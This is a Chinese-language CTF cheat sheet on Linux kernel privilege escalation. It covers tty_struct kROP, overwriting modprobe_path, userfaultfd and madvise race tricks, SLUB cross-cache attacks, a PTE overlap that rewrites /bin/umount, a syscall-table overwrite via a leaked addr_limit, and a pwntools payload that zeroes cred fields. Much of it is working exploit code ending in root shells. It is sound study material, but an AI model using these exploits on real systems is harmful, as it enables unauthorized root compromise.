# CTF Pwn - 内核利用技术

## 目录
- [tty_struct RIP 劫持与 kROP](#tty_struct-rip-hijack-and-krop)
  - [通过 tty_struct 上的伪虚表实现 kROP](#krop-via-fake-vtable-on-tty_struct)
  - [通过 ioctl 寄存器控制实现 AAW](#aaw-via-ioctl-register-control)
- [userfaultfd 竞态稳定](#userfaultfd-race-stabilization)
  - [替代竞态技术（uffd 禁用）](#alternative-race-techniques-uffd-disabled)
- [SLUB 分配器内部机制](#slub-allocator-internals)
  - [空闲链表指针加固](#freelist-pointer-hardening)
  - [空闲链表混淆（CONFIG_SLAB_FREELIST_HARDEN）](#freelist-obfuscation-config_slab_freelist_harden)
- [通过内核 Panic 泄露信息](#leak-via-kernel-panic)
- [通过 MADV_DONTNEED + mprotect 扩展竞态窗口（DiceCTF 2026）](#race-window-extension-via-madv_dontneed--mprotect-dicectf-2026)
- [通过 CPU 分割策略实现跨缓存攻击（DiceCTF 2026）](#cross-cache-attack-via-cpu-split-strategy-dicectf-2026)
- [用于文件写入的 PTE 重叠原语（DiceCTF 2026）](#pte-overlap-primitive-for-file-write-dicectf-2026)
- [通过失败文件打开绕过内核 addr_limit（Midnight Sun CTF 2018）](#kernel-addr_limit-bypass-via-failed-file-open-midnight-sun-ctf-2018)
- [自定义 binfmt 加载器 OOB 读取 + clear_user 提权（CONFidence Teaser 2019）](#custom-binfmt-loader-oob-read--clear_user-for-privesc-confidence-teaser-2019)

关于内核基础（环境搭建、堆喷结构、栈溢出、权限提升、modprobe_path、core_pattern），请参见 [kernel.md](kernel.md)。

关于保护绕过技术（KASLR、FGKASLR、KPTI、SMEP、SMAP）、GDB 调试、initramfs 工作流和利用模板，请参见 [kernel-bypass.md](kernel-bypass.md)。

---

## tty_struct RIP 劫持与 kROP

### 通过 tty_struct 上的伪虚表实现 kROP

利用对 `tty_struct` 的顺序写入（至少 0x200 字节），在结构体内构建一个两阶段的 kROP 链：

```text
tty_struct 用于 kROP 的布局：
  +0x00: magic, kref   -> 0x5401（保留 paranoia 检查）
  +0x08: dev            -> 指向 `pop rsp` gadget 的地址（`leave` 后的返回地址）
  +0x10: driver         -> &tty_struct + 0x170（栈枢轴目标；必须是有效的内核堆地址）
  +0x18: ops            -> &tty_struct + 0x50（指向伪虚表的指针）
  ...
  +0x50:                -> 伪虚表（0x120 字节），ioctl 入口指向 `leave` gadget
  ...
  +0x170:               -> 实际的 ROP 链（commit_creds、prepare_kernel_cred 等）
```

**执行流程：**
1. `ioctl(ptmx_fd, cmd, arg)` -> 调用 `tty_ioctl()` -> paranoia 检查通过（magic=0x5401）
2. `tty->ops->ioctl()` -> 跳转到伪虚表中的 `leave` gadget
3. `leave` 指令执行 `mov rsp, rbp; pop rbp` —— 此时 RBP 指向 `tty_struct` 本身
4. RSP 现在指向 `tty_struct + 0x08`（即 `dev` 字段）
5. `ret` 跳转到 `dev` 指向的 `pop rsp` gadget，弹出 `driver` 作为新的 RSP
6. RSP 现在指向 `tty_struct + 0x170` -> 实际的 ROP 链开始执行

**关键点：** 在调用虚表时，RBP 指向 `tty_struct`。`leave` 指令将栈枢轴到结构体内部，实现两阶段引导：先通过 `leave` 进入结构体，再通过 `pop rsp` 跳转到 ROP 链区域。

**替代方案：** 许多内核中固定偏移处存在 `push rdx; ... pop rsp; ... ret` gadget，可通过 `ioctl` 的第三个参数（RDX 完全可控）直接实现栈枢轴：

```c
// ioctl(fd, cmd, arg) -> RDX = arg（64 位可控）
// Gadget: push rdx; mov ebp, imm; pop rsp; pop r13; pop rbp; ret
// 效果：RSP = arg -> ROP 链位于用户指定地址
ioctl(ptmx_fd, 0, (unsigned long)rop_chain_addr);
```
### 通过 ioctl 寄存器控制实现 AAW

当不需要完整的 kROP 时，可以利用 `tty_struct` 实现 Arbitrary Address Write (AAW) 来覆盖 `modprobe_path`：

通过 `ioctl(fd, cmd, arg)` 实现寄存器控制：
- `cmd`（32 位）-> 部分控制 RBX、RCX、RSI
- `arg`（64 位）-> 完全控制 RDX、R8、R12

在伪造的 vtable 中写入 gadget：`mov DWORD PTR [rdx], esi; ret`

```c
// 重复调用 ioctl，每次写入 4 字节到 modprobe_path
for (int i = 0; i < 4; i++) {
    uint32_t val = *(uint32_t*)("/tmp/evil.sh\0\0\0\0" + i*4);
    ioctl(ptmx_fd, val, modprobe_path_addr + i*4);
}
```

---

## userfaultfd 竞态稳定化

`userfaultfd`（uffd）通过在页面错误时暂停执行，使内核竞态条件变得确定性。

**工作原理：**
1. 使用 `MAP_PRIVATE` 通过 `mmap()` 映射一块区域（不分配物理页）
2. 通过 `ioctl(UFFDIO_REGISTER)` 将该区域注册到 `userfaultfd`
3. 当内核访问该区域（例如在 `copy_from_user()` 期间）时，会触发页面错误
4. 出错的内核线程阻塞，直到用户空间处理该错误
5. 在阻塞期间，利用该时间修改共享状态（释放对象、堆喷射等）
6. 用户空间通过 `ioctl(UFFDIO_COPY)` 解决错误，内核线程恢复执行

```c
// 初始化
int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
struct uffdio_api api = { .api = UFFD_API, .features = 0 };
ioctl(uffd, UFFDIO_API, &api);

// 注册 mmap 区域
void *region = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
                    MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
struct uffdio_register reg = {
    .range = { .start = (unsigned long)region, .len = 0x1000 },
    .mode = UFFDIO_REGISTER_MODE_MISSING
};
ioctl(uffd, UFFDIO_REGISTER, &reg);

// 错误处理线程
void *handler(void *arg) {
    struct pollfd pfd = { .fd = uffd, .events = POLLIN };
    while (poll(&pfd, 1, -1) > 0) {
        struct uffd_msg msg;
        read(uffd, &msg, sizeof(msg));
        // >>> 竞态窗口：内核线程暂停 <<<
        // 释放目标对象，堆喷射等操作

        // 解决错误，恢复内核执行
        struct uffdio_copy copy = {
            .dst = msg.arg.pagefault.address & ~0xFFF,
            .src = (unsigned long)src_page,
            .len = 0x1000
        };
        ioctl(uffd, UFFDIO_COPY, &copy);
    }
}
```

**跨页分割对象：** 将内核对象放置跨越页边界。第一页正常，第二页触发 uffd。内核处理第一页后，在处理第二页时阻塞——竞态窗口发生在操作中间。

### 备选竞态技术（uffd 禁用时）

当 `CONFIG_USERFAULTFD` 被禁用或 uffd 仅限 root 使用时：

1. **大缓冲区的 `copy_from_user()`：** 传入超大缓冲区，减慢复制操作，扩大竞态窗口
2. **CPU 绑定 + 重负载系统调用：** 将竞态线程绑定到同一核，使用重内核函数延长时间窗口
3. **重复尝试：** 纯竞态无稳定化——循环运行利用，成功率依时间不同在 1% 到 50% 之间
4. **基于 TSC 的时序（上下文保护）：** 循环检测 TSC（时间戳计数器），确认执行处于 CFS 时间片开始，减少调度器抢占

---

## SLUB 分配器内部机制

### 空闲链表指针加固

自内核 5.7+ 起，SLUB 对象中的空闲指针放置在对象的**中间**（字对齐），而非偏移 0 处：

```c
// 来自 mm/slub.c
if (freepointer_area > sizeof(void *)) {
    s->offset = ALIGN(freepointer_area / 2, sizeof(void *));
}
```

**影响：** 从已释放块起始处的简单缓冲区溢出无法触及空闲指针。相邻块的下溢仍可能奏效。
### Freelist 混淆 (CONFIG_SLAB_FREELIST_HARDEN)

启用时，空闲指针会与每个缓存的随机值进行 XOR 混淆：

```text
stored_ptr = real_ptr ^ kmem_cache->random
```

**检测方法：** 在 GDB 中，找到 `kmem_cache_cpu`（通过 `$GS_BASE + kmem_cache.cpu_slab` 偏移），跟踪 `freelist` 指针，检查存储的值是否看起来像有效的内核地址。如果不是，则说明混淆已启用。

---

## 通过内核 Panic 泄露信息

当禁用 KASLR（或已知布局）且内核使用 `initramfs` 时：

```nasm
jmp &flag   ; 跳转到内存中 flag 文件内容的地址
```

内核发生 panic，panic 信息中包含 `CODE` 段的故障指令字节——这些字节即为 flag 内容。

**前提条件：** 无 KASLR（或完全布局已知）、`initramfs`（flag 被加载到内核内存中）、RIP 控制。

---

## 通过 MADV_DONTNEED + mprotect 扩展竞态窗口 (DiceCTF 2026)

**模式（cornelslop）：** 内核模块在检查和删除路径之间存在 TOCTOU 竞态，但窗口太窄，难以稳定触发。通过在长时间运行的内核操作期间强制反复触发缺页异常，将竞态窗口从毫秒级扩展到数十秒。

**技术步骤：**
1. 映射内核检查操作使用的内存（例如，`sha256_va_range()` 读取用户页）
2. 由第二线程循环执行 `MADV_DONTNEED`（丢弃页表项）+ `mprotect()`（切换权限）
3. 内核在计算哈希时每次缺页都会强制获取 VMA 锁并处理缺页异常
4. 内核操作反复阻塞，保持竞态窗口开启

```c
// 线程1：触发易受攻击的 CHECK ioctl（长时间哈希）
ioctl(fd, CHECK_ENTRY, &entry);

// 线程2：通过强制反复缺页扩展竞态窗口
while (racing) {
    madvise(buf, PAGE_SIZE, MADV_DONTNEED);  // 丢弃页表项
    mprotect(buf, PAGE_SIZE, PROT_READ);      // 下次访问触发缺页
    mprotect(buf, PAGE_SIZE, PROT_READ | PROT_WRITE);  // 恢复权限
}

// 线程3：触发并发的 DEL ioctl
ioctl(fd, DEL_ENTRY, &entry);  // 与 CHECK 路径竞态
```

**关键洞察：** `MADV_DONTNEED` 丢弃页表项但不释放底层页面。内核下一次访问该用户内存（如哈希计算时）会触发缺页，必须重新建立映射。结合 `mprotect()` 权限切换，造成锁竞争，将任何访问用户页的内核操作从亚毫秒级延长到数十秒——将不切实际的竞态变为可靠利用。

---

## 通过 CPU 分割策略实现跨缓存攻击 (DiceCTF 2026)

**模式（cornelslop）：** 易受攻击对象位于专用 SLUB 缓存（非 `kmalloc-*`），防止双重释放后标准的同缓存回收。通过跨 CPU 分配和释放，强制将页面从专用缓存转移到伙伴分配器。

**技术步骤：**
1. **在 CPU 0 上分配 N 个对象** — 填满 CPU 0 部分列表的 slab 页面
2. **从 CPU 1 释放相同对象** — 释放对象进入 CPU 1 的部分列表（非 CPU 0）
3. CPU 1 的部分列表溢出到 **节点部分列表**
4. 完全空的 slab 被释放到 **PCP（每 CPU 页面）列表**，然后进入 **伙伴分配器**
5. 重新分配这些页面为不同对象类型（如页表）

```c
// 将分配线程绑定到 CPU 0
cpu_set_t set;
CPU_ZERO(&set);
CPU_SET(0, &set);
sched_setaffinity(0, sizeof(set), &set);

// 分配 MAX_ENTRIES 个对象（填满约3个 slab 页面）
for (int i = 0; i < MAX_ENTRIES; i++)
    ioctl(fd, ALLOC_ENTRY, &entries[i]);

// 将释放线程绑定到 CPU 1
CPU_SET(1, &set);
sched_setaffinity(0, sizeof(set), &set);

// 从不同 CPU 释放 — 对象进入 CPU 1 的部分列表
for (int i = 0; i < MAX_ENTRIES; i++)
    ioctl(fd, FREE_ENTRY, &entries[i]);
// 空 slab 流动路径：CPU1 部分 → 节点部分 → PCP → 伙伴分配器
```

**关键洞察：** SLUB 按 CPU 分配和释放。当对象在与分配 CPU 不同的 CPU 上释放时，会进入不同的部分列表。该列表溢出时，空 slab 会返回伙伴分配器——完全逃离专用缓存。这使得即使是针对自定义 `kmem_cache_create()` 缓存的跨缓存攻击也成为可能，这些缓存通常对标准堆喷射免疫。

---
## PTE 重叠原语实现文件写入（DiceCTF 2026）

**模式（cornelslop）：** 在回收一个已释放页面作为 PTE（页表项）页面后，重叠一个匿名可写映射和一个只读文件映射，使两者通过被破坏的 PTE 共享同一个物理页面。

**技术步骤：**
1. 触发跨缓存双重释放，将页面放入伙伴分配器
2. 分配一个新的匿名映射——内核使用已释放页面作为 PTE 页面
3. 将一个只读文件（例如 `/bin/umount`）映射到相同的 PTE 区域
4. 被破坏的 PTE 页面现在包含指向文件物理页面的条目
5. 通过匿名（可写）映射写入 → 直接修改文件页面
6. 覆盖文件的 shebang/头部以执行攻击者控制的脚本

```c
// 跨缓存释放页面到伙伴分配器后：

// 1. 匿名映射回收该页面作为 PTE 存储
char *anon = mmap(NULL, PAGE_SIZE * 512, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
// 访问页面以填充回收页面中的 PTE
for (int i = 0; i < 512; i++)
    anon[i * PAGE_SIZE] = 'A';

// 2. 文件映射到重叠的虚拟范围
int file_fd = open("/bin/umount", O_RDONLY);
char *file_map = mmap(target_addr, PAGE_SIZE, PROT_READ,
                      MAP_PRIVATE | MAP_FIXED, file_fd, 0);

// 3. 通过匿名映射写入破坏文件内容
// 用 #!/tmp/pwn 覆盖 ELF 头部 / shebang
memcpy(anon + offset, "#!/tmp/pwn\n", 11);

// 4. 执行被破坏的二进制文件 → 以 root 权限运行攻击者脚本
system("/bin/umount /tmp 2>/dev/null");
```

**关键洞察：** PTE 页面只是内核页表分配器重新利用的普通物理页面。如果一个已释放的 slab 页面被回收为 PTE 页面，原始（被破坏的）slab 条目和新的 PTE 条目将共存。通过在同一 PTE 页面中精心重叠匿名映射和文件映射，对匿名映射的写入会透明地修改文件映射的页面——实现了无需任何直接内核写入原语的任意文件写入。这绕过了所有标准文件权限检查，因为写入发生在物理页面级别。

---

## 通过失败文件打开绕过内核 addr_limit（Midnight Sun CTF 2018）

**模式：** 内核模块调用 `set_fs(KERNEL_DS)` 以访问用户空间指针，但如果后续文件打开失败，则返回时未恢复旧的 `addr_limit`。通过将目标文件设为目录强制失败。现在用户空间的 `read()` 可以访问内核内存。

**利用策略：**
1. 内核模块有一个调试函数，将 `addr_limit` 设置为 `KERNEL_DS` 以读取调试文件
2. 如果 `filp_open()` 失败（例如目标是目录而非文件），错误路径提前返回
3. 错误路径未将 `addr_limit` 恢复为之前的值（`USER_DS`）
4. 调用进程现在永久拥有 `addr_limit = KERNEL_DS`
5. 普通的 `read()`/`write()` 系统调用现在可以访问内核内存地址
6. 利用此漏洞覆盖系统调用表条目为 `prepare_kernel_cred`/`commit_creds`

```c
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>

#define DEBUG_FILE "/tmp/debug_log"
#define SYS_TABLE_ADDR 0xffffffff81801400  // 来自 /proc/kallsyms

// 步骤 1：将调试文件变为目录 -> filp_open() 返回 -EISDIR 失败
mkdir(DEBUG_FILE, 0);

// 步骤 2：触发内核模块的调试函数
int fd = open("/dev/vuln_module", O_RDWR);
read(fd, &c, 1);  // 触发 debug_msg()，留下 addr_limit = KERNEL_DS

// 步骤 3：现在 read()/write() 可以访问内核内存
// 使用管道作为内核内存读写原语：
int pipefd[2];
pipe(pipefd);

// 将 prepare_kernel_cred 地址写入系统调用 100
unsigned long pkc_addr = 0xffffffff810a9ef0;  // prepare_kernel_cred
write(pipefd[1], &pkc_addr, sizeof(pkc_addr));
read(pipefd[0], (void*)((unsigned long*)SYS_TABLE_ADDR + 100), sizeof(unsigned long));

// 将 commit_creds 地址写入系统调用 101
unsigned long cc_addr = 0xffffffff810a9d80;  // commit_creds
write(pipefd[1], &cc_addr, sizeof(cc_addr));
read(pipefd[0], (void*)((unsigned long*)SYS_TABLE_ADDR + 101), sizeof(unsigned long));

// 步骤 4：调用被覆盖的系统调用获取 root 权限
int creds = syscall(100, 0);   // prepare_kernel_cred(0)
syscall(101, creds);            // commit_creds(creds)
// 现在以 root 身份运行
system("/bin/sh");
```

**关键洞察：** 当内核模块将 `addr_limit` 设置为 `KERNEL_DS` 以访问内核指针，但在错误路径未恢复时，用户空间进程会保留提升后的 `addr_limit`。这使得普通的 `read()`/`write()` 系统调用变成了内核内存读写原语。务必审计内核模块错误路径中缺失的 `set_fs()` 恢复——触发错误（例如将文件路径指向目录）通常很简单。

**参考：** Midnight Sun CTF 2018

---
## Custom binfmt Loader OOB Read + clear_user 提权（CONFidence Teaser 2019）

**模式（p4fmt）：** 内核模块 `p4fmt.ko` 注册了一个新的 `binfmt` 处理器，用于处理以 `"P4"` 开头的文件。加载器读取一个用户控制的头部：`{magic, version, arg, load_count, header_offset, entry}`，后面跟着 `load_count` 个 `{addr, length, offset}` 条目。两个缺失的检查使其成为一个完整的提权原语：`header_offset` 未经验证地用作指针偏移，访问 `bprm->buf[]`（对内核侧 `linux_binprm` 结构体的越界读取，包括 `struct cred *cred`），而 `loads[i].addr | 8` 选择了一个分支，调用 `_clear_user(addr, length)`，参数完全由攻击者控制——这是一个任意清零原语，且在 `install_exec_creds()` 提交 `bprm->cred` 之前执行。

```python
from pwn import *

# 阶段1：通过对内核侧 linux_binprm 缓冲区的 OOB header_offset 泄露 bprm->cred。
# load_count=5，header_offset=0x80-0x18 -> loads[] 从 bprm->buf 之后的字段解析。
leak = b'P4' + p8(0) + p8(1) + p32(5) + p64(0x80 - 0x18) + p64(0)
# 执行后 -> dmesg 中 "vm_mmap(..., length=<cred_addr>, ...)" 泄露了 cred 指针。

# 阶段2：通过 clear_user 将 bprm->cred 中的 uid/gid/suid/sgid/euid/egid/fsuid/fsgid 清零。
# arg=1，且 load 条目中 addr 的第3位被置位 -> 内核调用 _clear_user(addr, length)。
cred = 0xffff...          # 从泄露中获得
entries  = p64(0x7000000 | 7) + p64(0x1000) + p64(0)            # mmap 一个 RWX 页用于 shellcode
entries += p64((cred + 0x10) | 8) + p64(0x48) + p64(0)          # clear_user(cred->uid..fsgid)
binary   = b'P4' + p8(0) + p8(1) + p32(2) + p64(0x18) + p64(0x7000090) + entries
binary   = binary.ljust(0x7000090 & 0xfff, b'\x00') + asm(shellcraft.sh())
# 执行后 -> install_exec_creds 看到 uid=0 的 cred -> 获得 root shell（绕过 drop_privileges）
```

**关键洞察：** 自定义的 `binfmt_misc` 风格加载器是一个极具潜力的攻击目标，因为它们在 `install_exec_creds` 提交每次执行的凭证结构之前解析攻击者提供的头部。任何在此窗口内操作 `bprm` 的原语（越界读取泄露 `bprm->cred`、任意 `_clear_user` 清零凭证字段、带有受控标志/权限的 `vm_mmap` 用于内核辅助的 RWX）都可以组合成提权链，而无需传统的内核内存破坏链。务必审计自定义模块中的 `load_*_binary` 函数，重点检查 (a) 头部偏移和计数的边界，(b) 传递给 `_clear_user`/`copy_to_user` 的 `addr`/`length` 参数的 `access_ok`/范围检查，以及 (c) 通过 `printk` 的侧信道信息泄露。

**参考资料：** CONFidence CTF 2019 Teaser — p4fmt，writeup 13992
